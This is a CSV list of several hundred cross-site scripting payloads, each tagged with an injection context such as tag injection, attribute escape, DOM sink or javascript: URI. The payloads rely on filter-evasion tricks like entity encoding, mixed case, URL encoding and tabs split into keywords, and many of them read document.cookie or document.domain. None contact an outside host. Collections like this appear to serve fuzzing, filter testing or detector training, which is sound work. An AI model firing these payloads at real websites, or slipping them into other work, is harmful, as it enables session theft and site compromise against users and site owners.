payload,context
<img onanimationiteration=confirm(document.domain)>,tag_injection
<img onanimationiteration=console.log(location.hash)/>,tag_injection
"<img onload=confirm(String.fromCharCode(88,83,83))>",tag_injection
"%3Cimg onbegin=prompt(String.fromCharCode(88,83,83))/%3E",tag_injection
"""><img on&#97;nim&#97;tion&#101;nd=prompt('XSS')>",tag_injection
' on&#97;nim&#97;tion&#101;nd=confirm(docum&#101;nt.dom&#97;in) ',attribute_escape
""" oNrePeaT=aLerT(STriNg.FroMChArCOde(88,83,83)) """,attribute_escape
<imG oNrePeaT=cOnsOle.loG(dOcuMenT.dOmaIn)>,tag_injection
"<img onbegin=prompt(String.fromCharCode(88,83,83))/>",tag_injection
' onend=alert(location.hash) ',attribute_escape
"document.write(""<img src=x onerror=alert(location.hash)>"")",dom_sink
""" oNanImaTioNenD=cOnsOle.loG(1) """,attribute_escape
<script>/x/consol&#101;.log(docum&#101;nt.cooki&#101;)</script>,script_injection
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=pRomPt(1)>""",dom_sink
' onr&#101;p&#101;&#97;t=&#97;l&#101;rt(1) ',attribute_escape
%22 onfocus=confirm(location.hash) autofocus=%22,attribute_escape
""" onfocus=confirm(loc&#97;tion.h&#97;sh) &#97;utofocus=""",attribute_escape
<img onanimationend=confirm(document.domain)>,tag_injection
javascript:confirm('XSS'),js_uri
""" onload=alert(String.fromCharCode(88,83,83)) """,attribute_escape
%22 onerror=console.log(location.hash) %22,attribute_escape
""" oNrePeaT=cOnsOle.loG(dOcuMenT.dOmaIn) """,attribute_escape
%27 onbegin=prompt(location.hash) %27,attribute_escape
"""><img on&#97;nim&#97;tion&#101;nd=prompt(docum&#101;nt.dom&#97;in)>",tag_injection
""" oNenD=aLerT(dOcuMenT.cOokIe) """,attribute_escape
<script>/x/console.log(1)</script>,script_injection
' oNrePeaT=aLerT(lOcaTioN.hAsh) ',attribute_escape
<img onbegin=alert(document.domain)>,tag_injection
"setTimeout(%22prompt(1)%22,0)",dom_sink
"j&#97;vascr	ipt:prompt(String.fromCharCode(88,83,83))",js_uri
<img on&#101;rror=consol&#101;.log('XSS')>,tag_injection
<img onlo&#97;d=consol&#101;.log(loc&#97;tion.h&#97;sh)>,tag_injection
"""><Img onEnd=alErt(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
<img on&#97;nim&#97;tionit&#101;r&#97;tion=prompt(docum&#101;nt.cooki&#101;)>,tag_injection
location.href=%22javascript:alert(1)%22,dom_sink
<img on&#97;nim&#97;tionst&#97;rt=prompt(docum&#101;nt.cooki&#101;)>,tag_injection
""" onfocus=prompt(String.fromCharCode(88,83,83)) autofocus=""",attribute_escape
"javascript:void(\u0061lert(String.fromCharCode(88,83,83)))",js_uri
"%3Cimg onbegin=console.log(String.fromCharCode(88,83,83))%3E",tag_injection
<img onlo&#97;d=prompt(docum&#101;nt.dom&#97;in)/>,tag_injection
%22 onfocus=console.log(location.hash) autofocus=%22,attribute_escape
<img on&#97;nim&#97;tionst&#97;rt=confirm(docum&#101;nt.cooki&#101;)>,tag_injection
<scRipT>/*/pRomPt(1)</scRipT>,script_injection
%22><img onbegin=confirm(document.domain)>,tag_injection
' onlo&#97;d=prompt(docum&#101;nt.dom&#97;in) ',attribute_escape
"""><img onanimationend=\u0061lert('XSS')>",tag_injection
' on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log(docum&#101;nt.cooki&#101;) ',attribute_escape
<img on&#101;nd=confirm(loc&#97;tion.h&#97;sh)>,tag_injection
"document.body.innerHTML=""<img src=x onerror=alert(location.hash)>""",dom_sink
<script>/x/confirm(location.hash)</script>,script_injection
%22 onanimationiteration=alert(document.cookie) %22,attribute_escape
%3Cscript%3E/*/confirm(location.hash)%3C/script%3E,script_injection
""" onload=console.log(1) """,attribute_escape
""" on&#97;nim&#97;tion&#101;nd=consol&#101;.log(docum&#101;nt.cooki&#101;) """,attribute_escape
<imG oNanImaTioNitEraTioN=pRomPt(DocUmeNt.DomAin)/>,tag_injection
""" onlo&#97;d=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
%3Cimg onanimationstart=confirm('XSS')%3E,tag_injection
"document.write(""%3Cimg src=x onerror=confirm(location.hash)%3E"")",dom_sink
"""><img on&#101;nd=prompt(loc&#97;tion.h&#97;sh)>",tag_injection
"s&#101;tTim&#101;out(""consol&#101;.log(docum&#101;nt.dom&#97;in)"",0)",dom_sink
"' onload=console.log(String.fromCharCode(88,83,83)) '",attribute_escape
<script>alert`%27XSS%27`</script>,script_injection
' oNloAd=ConFirM('XSS') ',attribute_escape
<imG oNanImaTioNenD=cOnsOle.loG(dOcuMenT.dOmaIn)/>,tag_injection
javascr	ipt:void(prompt('XSS')),js_uri
"%27 onload=prompt(String.fromCharCode(88,83,83)) %27",attribute_escape
eval(%22prompt(1)%22),dom_sink
"<script>confirm`String.fromCh&#97;rCod&#101;(88,83,83)`</script>",script_injection
%3Cimg onrepeat=prompt('XSS')%3E,tag_injection
"""><img onanimationiteration=prompt(String.fromCharCode(88,83,83))>",tag_injection
%3Cimg onerror=confirm(1)%3E,tag_injection
""" onend=\u0061lert(document.domain) """,attribute_escape
<img onanimationiteration=alert(1)/>,tag_injection
<imG oNrePeaT=cOnsOle.loG(1)/>,tag_injection
%27 onanimationend=prompt(%27XSS%27) %27,attribute_escape
""" oNloAd=ConSolE.lOg(1) """,attribute_escape
"<imG oNanImaTioNitEraTioN=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))/>",tag_injection
javascr	ipt:prompt(location.hash),js_uri
j&#97;vascr	ipt:prompt(document.domain),js_uri
%3Cimg onrepeat=confirm('XSS')%3E,tag_injection
"document.write(%22<img src=x onerror=prompt(String.fromCharCode(88,83,83))>%22)",dom_sink
<imG oNenD=cOnsOle.loG('XSS')>,tag_injection
""" onbegin=alert(document.cookie) """,attribute_escape
%22 onfocus=confirm(document.domain) autofocus=%22,attribute_escape
%27 onbegin=confirm(document.cookie) %27,attribute_escape
%22><img onend=console.log(%27XSS%27)>,tag_injection
"%22 onfocus=prompt(String.fromCharCode(88,83,83)) autofocus=%22",attribute_escape
<img onr&#101;p&#101;&#97;t=confirm(1)>,tag_injection
""" oNrePeaT=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83)) """,attribute_escape
"""%3E%3Cimg onerror=prompt(String.fromCharCode(88,83,83))%3E",tag_injection
<img onr&#101;p&#101;&#97;t=confirm(docum&#101;nt.dom&#97;in)>,tag_injection
javascript:prompt(location.hash),js_uri
' onend=prompt('XSS') ',attribute_escape
<img onload=prompt(1)>,tag_injection
<imG oNerRor=coNsoLe.Log(doCumEnt.doMaiN)>,tag_injection
%22><img onanimationstart=confirm(1)>,tag_injection
' onanimationcancel=\u0061lert(document.domain) ',attribute_escape
%27 onrepeat=prompt(%27XSS%27) %27,attribute_escape
"""><img onanimationstart=console.log('XSS')>",tag_injection
"""%3E%3Cimg onbegin=confirm(document.cookie)%3E",tag_injection
<imG oNanImaTioNstArt=coNsoLe.Log(1)>,tag_injection
"&#101;v&#97;l(""confirm(1)"")",dom_sink
"""><img onanimationiteration=confirm(document.cookie)>",tag_injection
""" onanimationend=prompt(document.cookie) """,attribute_escape
' on&#101;nd=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) ',attribute_escape
' oNrePeaT=aLerT('XSS') ',attribute_escape
<img onrepeat=prompt(%27XSS%27)>,tag_injection
<img onb&#101;gin=prompt(docum&#101;nt.cooki&#101;)/>,tag_injection
j&#97;v&#97;script:&#97;l&#101;rt(docum&#101;nt.dom&#97;in),js_uri
""" onload=\u0061lert(1) """,attribute_escape
' onbegin=console.log(document.cookie) ',attribute_escape
<img onlo&#97;d=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)/>,tag_injection
""" onlo&#97;d=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
%3Cimg onend=console.log(location.hash)%3E,tag_injection
' oNbeGin=alErt(doCumEnt.doMaiN) ',attribute_escape
""" onfocus=&#97;l&#101;rt(1) &#97;utofocus=""",attribute_escape
"setTimeout(%22prompt(document.domain)%22,0)",dom_sink
<img onanimationiteration=prompt(%27XSS%27)/>,tag_injection
%3Cimg onanimationstart=console.log(document.domain)/%3E,tag_injection
"%22 onanimationiteration=alert(String.fromCharCode(88,83,83)) %22",attribute_escape
<scRipT>pRomPt`LocAtiOn.HasH`</scRipT>,script_injection
"' oNerRor=prOmpT(STriNg.FroMChArCOde(88,83,83)) '",attribute_escape
"<scr	ipt>prompt`String.fromCharCode(88,83,83)`</scr	ipt>",script_injection
"""%3E%3Cimg onanimationend=console.log(1)%3E",tag_injection
%27 onanimationiteration=console.log(document.domain) %27,attribute_escape
<imG oNloAd=AleRt(LocAtiOn.HasH)>,tag_injection
%3Cimg onerror=console.log(document.domain)%3E,tag_injection
<imG oNanImaTioNenD=pRomPt('XSS')/>,tag_injection
%22><img onanimationstart=alert(location.hash)>,tag_injection
<img onbegin=console.log('XSS')>,tag_injection
<img onanimationiteration=console.log(document.cookie)/>,tag_injection
<script>/x/confirm('XSS')</script>,script_injection
<img onanimationstart=confirm(location.hash)>,tag_injection
<img onend=confirm(document.domain)/>,tag_injection
"""%3E%3Cimg onbegin=confirm(1)%3E",tag_injection
<img onlo&#97;d=consol&#101;.log('XSS')>,tag_injection
"""><Img onAniMatIonCanCel=alErt(doCumEnt.doMaiN)>",tag_injection
<img on&#101;nd=consol&#101;.log(loc&#97;tion.h&#97;sh)/>,tag_injection
"' oNloAd=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83)) '",attribute_escape
"""><img on&#97;nim&#97;tionit&#101;r&#97;tion=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
""" oNanImaTioNenD=aLerT(STriNg.FroMChArCOde(88,83,83)) """,attribute_escape
J&#97;VasCriPt:AleRt('XSS'),js_uri
<scr	ipt>//prompt('XSS')</scr	ipt>,script_injection
document.body.innerHTML=%22<img src=x onerror=console.log(document.cookie)>%22,dom_sink
' oNanImaTioNenD=pRomPt(DocUmeNt.CooKie) ',attribute_escape
<img onanimationiteration=alert(location.hash)/>,tag_injection
"document.body.innerHTML=""<img src=x onerror=console.log(String.fromCharCode(88,83,83))>""",dom_sink
%22 onbegin=console.log(1) %22,attribute_escape
' onanimationiteration=console.log(document.domain) ',attribute_escape
<img onerror=confirm(document.cookie)>,tag_injection
<img onbegin=prompt('XSS')>,tag_injection
<img onanimationstart=prompt(location.hash)>,tag_injection
<imG oNanImaTioNitEraTioN=aLerT(1)>,tag_injection
"location.href=""javascript:alert(location.hash)""",dom_sink
""" onanimationcancel=alert(location.hash) """,attribute_escape
<imG oNanImaTioNenD=pRomPt(1)/>,tag_injection
' oNenD=pRomPt(DocUmeNt.CooKie) ',attribute_escape
%3Cimg onbegin=alert(location.hash)%3E,tag_injection
<imG oNanImaTioNitEraTioN=cOnsOle.loG(lOcaTioN.hAsh)>,tag_injection
<img onbegin=\u0061lert(1)/>,tag_injection
"""><img onr&#101;p&#101;&#97;t=consol&#101;.log(loc&#97;tion.h&#97;sh)>",tag_injection
' onanimationiteration=console.log(1) ',attribute_escape
%3Cimg onend=console.log(document.cookie)%3E,tag_injection
' on&#101;rror=confirm(docum&#101;nt.cooki&#101;) ',attribute_escape
"' onerror=console.log(String.fromCharCode(88,83,83)) '",attribute_escape
<scr	ipt>//confirm('XSS')</scr	ipt>,script_injection
<imG oNloAd=ProMpt(doCumEnt.doMaiN)>,tag_injection
<img on&#101;nd=&#97;l&#101;rt('XSS')/>,tag_injection
"' oNanImaTioNcaNceL=aLerT(STriNg.FroMChArCOde(88,83,83)) '",attribute_escape
"""%3E%3Cimg onload=console.log(location.hash)%3E",tag_injection
<img onerror=console.log('XSS')>,tag_injection
"&#101;v&#97;l(""consol&#101;.log('XSS')"")",dom_sink
<img onbegin=console.log(1)>,tag_injection
"document.write(""%3Cimg src=x onerror=console.log(location.hash)%3E"")",dom_sink
<img onrepeat=console.log(%27XSS%27)/>,tag_injection
"document.body.innerHTML=""<img src=x onerror=\u0061lert('XSS')>""",dom_sink
<img on&#97;nim&#97;tion&#101;nd=consol&#101;.log(loc&#97;tion.h&#97;sh)/>,tag_injection
' onload=prompt(1) ',attribute_escape
"""><Img onAniMatIonIteRatIon=alErt(doCumEnt.doMaiN)>",tag_injection
""" onbegin=\u0061lert(location.hash) """,attribute_escape
' oNenD=pRomPt(1) ',attribute_escape
"""><Img onAniMatIonStaRt=ConSolE.lOg(LocAtiOn.HasH)>",tag_injection
"eval(""alert(document.domain)"")",dom_sink
<imG oNbeGin=prOmpT(dOcuMenT.cOokIe)/>,tag_injection
"""><img on&#97;nim&#97;tionst&#97;rt=consol&#101;.log(1)>",tag_injection
""" on&#97;nim&#97;tionit&#101;r&#97;tion=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
%3Cimg onload=confirm(document.domain)/%3E,tag_injection
"""><img onb&#101;gin=consol&#101;.log('XSS')>",tag_injection
' on&#97;nim&#97;tionst&#97;rt=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) ',attribute_escape
<imG oNanImaTioNstArt=coNfiRm(DocUmeNt.CooKie)>,tag_injection
%22><img onend=alert(document.cookie)>,tag_injection
"<img onlo&#97;d=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection
<imG oNerRor=coNfiRm('XSS')>,tag_injection
""" onanimationiteration=confirm(location.hash) """,attribute_escape
"<img on&#101;rror=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
%27 onbegin=console.log(%27XSS%27) %27,attribute_escape
""" oNanImaTioNenD=cOnsOle.loG(dOcuMenT.dOmaIn) """,attribute_escape
%3Cimg onanimationend=prompt(1)/%3E,tag_injection
' on&#101;rror=confirm(docum&#101;nt.dom&#97;in) ',attribute_escape
javascript:\u0061lert(1),js_uri
<imG oNerRor=coNfiRm('XSS')/>,tag_injection
document.body.innerHTML=%22<img src=x onerror=console.log(%27XSS%27)>%22,dom_sink
' on&#97;nim&#97;tionit&#101;r&#97;tion=prompt('XSS') ',attribute_escape
' onanimationiteration=\u0061lert('XSS') ',attribute_escape
<img onerror=alert(1)/>,tag_injection
%22 onrepeat=console.log(location.hash) %22,attribute_escape
<scRipT>pRomPt(LocAtiOn.HasH)</scRipT>,script_injection
%22 onanimationiteration=confirm(document.domain) %22,attribute_escape
<imG oNrePeaT=cOnfIrm(doCumEnt.coOkiE)/>,tag_injection
' oNanImaTioNitEraTioN=pRomPt(1) ',attribute_escape
"document.write(""<img src=x onerror=prompt(location.hash)>"")",dom_sink
<img onanimationcancel=\u0061lert('XSS')/>,tag_injection
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>"")",dom_sink
%3Cimg onerror=console.log('XSS')%3E,tag_injection
""" oNanImaTioNstArt=alErt(doCumEnt.coOkiE) """,attribute_escape
%22 onrepeat=confirm(location.hash) %22,attribute_escape
%22><img onload=confirm(document.cookie)>,tag_injection
""" oNanImaTioNitEraTioN=pRomPt(1) """,attribute_escape
<img onr&#101;p&#101;&#97;t=confirm(loc&#97;tion.h&#97;sh)>,tag_injection
%3Cscript%3Econfirm`'XSS'`%3C/script%3E,script_injection
<imG oNerRor=prOmpT('XSS')>,tag_injection
' on&#101;rror=prompt(1) ',attribute_escape
"""%3E%3Cimg onanimationend=prompt(document.domain)%3E",tag_injection
<imG oNenD=cOnfIrm(doCumEnt.coOkiE)>,tag_injection
<img onb&#101;gin=prompt(docum&#101;nt.cooki&#101;)>,tag_injection
<img on&#97;nim&#97;tionst&#97;rt=&#97;l&#101;rt('XSS')/>,tag_injection
%3Cimg onend=confirm(1)/%3E,tag_injection
%27 onanimationiteration=console.log(document.cookie) %27,attribute_escape
<script>confirm('XSS')</script>,script_injection
"""><Img onAniMatIonEnd=coNsoLe.Log('XSS')>",tag_injection
%22 onbegin=console.log(%27XSS%27) %22,attribute_escape
<script>//alert(document.cookie)</script>,script_injection
<script>//consol&#101;.log(docum&#101;nt.dom&#97;in)</script>,script_injection
"<scRipT>/X/aLerT(STriNg.FroMChArCOde(88,83,83))</scRipT>",script_injection
"%22><img onanimationend=console.log(String.fromCharCode(88,83,83))>",tag_injection
%27 onanimationstart=prompt(%27XSS%27) %27,attribute_escape
""" oNanImaTioNenD=pRomPt(StrIng.frOmCHarCodE(88,83,83)) """,attribute_escape
' onerror=confirm(1) ',attribute_escape
""" oNloAd=ConFirM(dOcuMenT.dOmaIn) """,attribute_escape
"<script>/*/&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection
<scr	ipt>//confirm(document.domain)</scr	ipt>,script_injection
%3Cimg onanimationiteration=prompt(location.hash)%3E,tag_injection
%3Cscript%3E/*/prompt(1)%3C/script%3E,script_injection
"&#101;v&#97;l(""confirm('XSS')"")",dom_sink
<imG oNanImaTioNstArt=coNsoLe.Log('XSS')/>,tag_injection
"""><img onerror=confirm(1)>",tag_injection
<img onanimationstart=alert(document.domain)/>,tag_injection
"location.href=""javascr	ipt:console.log('XSS')""",dom_sink
<img onlo&#97;d=confirm(1)>,tag_injection
' onanimationstart=alert(document.domain) ',attribute_escape
j&#97;v&#97;script:prompt(docum&#101;nt.cooki&#101;),js_uri
<img onanimationstart=prompt(document.domain)/>,tag_injection
%3Cimg onbegin=confirm(1)/%3E,tag_injection
"s&#101;tTim&#101;out(""confirm(1)"",0)",dom_sink
<script>//confirm(document.cookie)</script>,script_injection
<img on&#97;nim&#97;tionst&#97;rt=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection
"%22 onload=alert(String.fromCharCode(88,83,83)) %22",attribute_escape
%22 onrepeat=alert(%27XSS%27) %22,attribute_escape
' onb&#101;gin=confirm(docum&#101;nt.cooki&#101;) ',attribute_escape
"<imG oNanImaTioNitEraTioN=pRomPt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
"""><Img onAniMatIonEnd=coNfiRm(LocAtiOn.HasH)>",tag_injection
%22><img onload=alert(%27XSS%27)>,tag_injection
<script>consol&#101;.log(docum&#101;nt.dom&#97;in)</script>,script_injection
<script>//confirm(%27XSS%27)</script>,script_injection
"""><img onerror=prompt('XSS')>",tag_injection
' onrepeat=console.log(document.domain) ',attribute_escape
<scr	ipt>alert`document.domain`</scr	ipt>,script_injection
' onanimationcancel=\u0061lert(1) ',attribute_escape
"""%3E%3Cimg onload=prompt(location.hash)%3E",tag_injection
""" onlo&#97;d=confirm(docum&#101;nt.dom&#97;in) """,attribute_escape
""" oNenD=cOnfIrm(loCatIon.haSh) """,attribute_escape
<img onanimationend=prompt(document.cookie)/>,tag_injection
<scRipT>/*/aLerT(dOcuMenT.cOokIe)</sCriPt>,script_injection
"""><img onanimationcancel=\u0061lert(document.cookie)>",tag_injection
"""%3E%3Cimg onanimationcancel=alert('XSS')%3E",tag_injection
<imG oNrePeaT=pRomPt(1)/>,tag_injection
%22 onanimationstart=prompt(1) %22,attribute_escape
"""><Img onAniMatIonEnd=prOmpT(dOcuMenT.cOokIe)>",tag_injection
%22 onrepeat=console.log(document.cookie) %22,attribute_escape
<imG oNbeGin=coNsoLe.Log(doCumEnt.doMaiN)/>,tag_injection
<img onerror=confirm(1)/>,tag_injection
"<img onend=\u0061lert(String.fromCharCode(88,83,83))/>",tag_injection
<imG oNenD=aLerT(dOcuMenT.cOokIe)>,tag_injection
%3Cimg onload=alert(document.domain)/%3E,tag_injection
<scr	ipt>alert(document.cookie)</scr	ipt>,script_injection
%22 onerror=prompt(document.domain) %22,attribute_escape
' oNloAd=ProMpt(doCumEnt.doMaiN) ',attribute_escape
<img onrepeat=confirm(%27XSS%27)>,tag_injection
eval(%22confirm(1)%22),dom_sink
%3Cimg onanimationstart=confirm(document.cookie)/%3E,tag_injection
""" oNanImaTioNitEraTioN=aLerT(lOcaTioN.hAsh) """,attribute_escape
<scRipT>//alErt(1)</sCriPt>,script_injection
""" onanimationcancel=alert(document.cookie) """,attribute_escape
<img onerror=alert(%27XSS%27)>,tag_injection
<imG oNloAd=ConSolE.lOg(1)/>,tag_injection
<scRipT>/X/cOnsOle.loG('XSS')</scRipT>,script_injection
<img on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log(1)>,tag_injection
"%3Cimg onerror=confirm(String.fromCharCode(88,83,83))/%3E",tag_injection
"<script>//alert(String.fromCharCode(88,83,83))</script>",script_injection
""" oNanImaTioNstArt=alErt(StRinG.fRomChaRCoDe(88,83,83)) """,attribute_escape
"""%3E%3Cimg onend=confirm(document.cookie)%3E",tag_injection
"""%3E%3Cimg onanimationend=alert(location.hash)%3E",tag_injection
""" oNanImaTioNstArt=coNfiRm(DocUmeNt.CooKie) """,attribute_escape
<img on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log(loc&#97;tion.h&#97;sh)/>,tag_injection
%22 onload=alert(%27XSS%27) %22,attribute_escape
%3Cimg onload=alert(1)%3E,tag_injection
%22><img onload=console.log(document.domain)>,tag_injection
<img on&#101;rror=&#97;l&#101;rt('XSS')/>,tag_injection
"<script>/x/alert(String.fromCharCode(88,83,83))</script>",script_injection
"""><Img onBegIn=ConSolE.lOg(DocUmeNt.CooKie)>",tag_injection
<imG oNanImaTioNitEraTioN=cOnfIrm(loCatIon.haSh)/>,tag_injection
"document.body.innerHTML=""<img src=x onerror=confirm(document.cookie)>""",dom_sink
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=confirm(1)>""",dom_sink
' oNanImaTioNenD=aLerT(1) ',attribute_escape
<img on&#101;rror=prompt('XSS')>,tag_injection
%22 onfocus=prompt(%27XSS%27) autofocus=%22,attribute_escape
"""%3E%3Cimg onbegin=alert('XSS')%3E",tag_injection
%3Cimg onanimationiteration=alert(document.domain)%3E,tag_injection
%3Cimg onanimationiteration=prompt(document.cookie)%3E,tag_injection
"""><img onerror=prompt(1)>",tag_injection
""" oNfoCus=coNsoLe.Log(doCumEnt.doMaiN) AutOfoCus=""",attribute_escape
%3Cimg onanimationiteration=prompt('XSS')/%3E,tag_injection
<imG oNbeGin=prOmpT(dOcuMenT.dOmaIn)>,tag_injection
<imG oNanImaTioNstArt=coNfiRm(LocAtiOn.HasH)>,tag_injection
"""><Img onAniMatIonStaRt=ConSolE.lOg(DocUmeNt.DomAin)>",tag_injection
<img onlo&#97;d=prompt(loc&#97;tion.h&#97;sh)/>,tag_injection
%3Cscript%3E/*/alert(location.hash)%3C/script%3E,script_injection
<script>/x/\u0061lert('XSS')</script>,script_injection
' onanimationend=confirm(location.hash) ',attribute_escape
"document.write(""%3Cimg src=x onerror=alert('XSS')%3E"")",dom_sink
""" onload=prompt(document.cookie) """,attribute_escape
""" onload=alert(1) """,attribute_escape
""" onerror=confirm(String.fromCharCode(88,83,83)) """,attribute_escape
%3Cimg onanimationiteration=alert(1)%3E,tag_injection
<imG oNanImaTioNitEraTioN=cOnfIrm(doCumEnt.coOkiE)>,tag_injection
<scr	ipt>//console.log(location.hash)</scr	ipt>,script_injection
"""><img on&#101;nd=&#97;l&#101;rt('XSS')>",tag_injection
<scr	ipt>prompt(location.hash)</scr	ipt>,script_injection
"<img on&#101;nd=confirm(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection
"<script>//console.log(String.fromCharCode(88,83,83))</script>",script_injection
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=consol&#101;.log(1)>"")",dom_sink
"""><img onload=\u0061lert(location.hash)>",tag_injection
"""><img on&#97;nim&#97;tionit&#101;r&#97;tion=&#97;l&#101;rt('XSS')>",tag_injection
""" onlo&#97;d=consol&#101;.log(loc&#97;tion.h&#97;sh) """,attribute_escape
JavAscRipT:vOid(coNsoLe.Log(doCumEnt.coOkiE)),js_uri
<imG oNbeGin=prOmpT('XSS')>,tag_injection
"%3Cscript%3E/*/prompt(String.fromCharCode(88,83,83))%3C/script%3E",script_injection
"""><img onanimationstart=prompt(String.fromCharCode(88,83,83))>",tag_injection
"<img onerror=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection
' onanimationstart=alert(location.hash) ',attribute_escape
<img onb&#101;gin=prompt(loc&#97;tion.h&#97;sh)/>,tag_injection
<img on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log(docum&#101;nt.cooki&#101;)>,tag_injection
' onend=alert('XSS') ',attribute_escape
<imG oNbeGin=coNfiRm(1)>,tag_injection
<img onload=confirm(location.hash)/>,tag_injection
' onlo&#97;d=&#97;l&#101;rt(docum&#101;nt.cooki&#101;) ',attribute_escape
<img onr&#101;p&#101;&#97;t=prompt('XSS')>,tag_injection
<imG oNanImaTioNstArt=coNfiRm(DocUmeNt.DomAin)/>,tag_injection
"""%3E%3Cimg onload=confirm(1)%3E",tag_injection
%22><img onrepeat=prompt(document.cookie)>,tag_injection
"%22><img onanimationend=confirm(String.fromCharCode(88,83,83))>",tag_injection
<img onanimationstart=console.log(%27XSS%27)>,tag_injection
%22><img onend=alert(location.hash)>,tag_injection
"' onanimationend=alert(String.fromCharCode(88,83,83)) '",attribute_escape
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=cOnfIrm(1)>""",dom_sink
%3Cimg onend=console.log('XSS')/%3E,tag_injection
<scr	ipt>//alert(document.domain)</scr	ipt>,script_injection
"location.href=%22javascript:confirm(String.fromCharCode(88,83,83))%22",dom_sink
<img onerror=\u0061lert(1)/>,tag_injection
%3Cimg onload=alert(document.domain)%3E,tag_injection
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>"")",dom_sink
<scr	ipt>//alert(1)</scr	ipt>,script_injection
""" on&#97;nim&#97;tion&#101;nd=&#97;l&#101;rt(1) """,attribute_escape
"&#101;v&#97;l(""prompt(1)"")",dom_sink
%3Cimg onanimationend=alert(location.hash)%3E,tag_injection
"""%3E%3Cimg onend=console.log(document.cookie)%3E",tag_injection
""" onfocus=confirm(String.fromCharCode(88,83,83)) autofocus=""",attribute_escape
%22 onend=confirm(document.domain) %22,attribute_escape
""" onfocus=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) &#97;utofocus=""",attribute_escape
"<scr	ipt>/x/confirm(String.fromCharCode(88,83,83))</scr	ipt>",script_injection
' onb&#101;gin=prompt(1) ',attribute_escape
<img onanimationcancel=alert(1)>,tag_injection
%22 onanimationiteration=confirm(%27XSS%27) %22,attribute_escape
"%27 onanimationiteration=confirm(String.fromCharCode(88,83,83)) %27",attribute_escape
%22 onbegin=prompt(1) %22,attribute_escape
"""><img onanimationiteration=\u0061lert(document.cookie)>",tag_injection
""" oNloAd=AleRt(1) """,attribute_escape
<img on&#101;nd=prompt(docum&#101;nt.dom&#97;in)>,tag_injection
"""%3E%3Cimg onbegin=console.log('XSS')%3E",tag_injection
<img onanimationstart=alert(%27XSS%27)/>,tag_injection
"<img onrepeat=alert(String.fromCharCode(88,83,83))>",tag_injection
"document.body.innerHTML=""<img src=x onerror=alert('XSS')>""",dom_sink
j&#97;vascript:alert(document.cookie),js_uri
<imG oNanImaTioNitEraTioN=cOnsOle.loG('XSS')/>,tag_injection
""" onb&#101;gin=confirm(docum&#101;nt.cooki&#101;) """,attribute_escape
"""><img onanimationend=console.log(document.domain)>",tag_injection
"""%3E%3Cimg onerror=confirm(1)%3E",tag_injection
"document.body.innerHTML=""%3Cimg src=x onerror=confirm(document.domain)%3E""",dom_sink
<script>/*/alert(%27XSS%27)</script>,script_injection
%3Cimg onanimationstart=alert(document.domain)%3E,tag_injection
"location.href=%22javascript:console.log(String.fromCharCode(88,83,83))%22",dom_sink
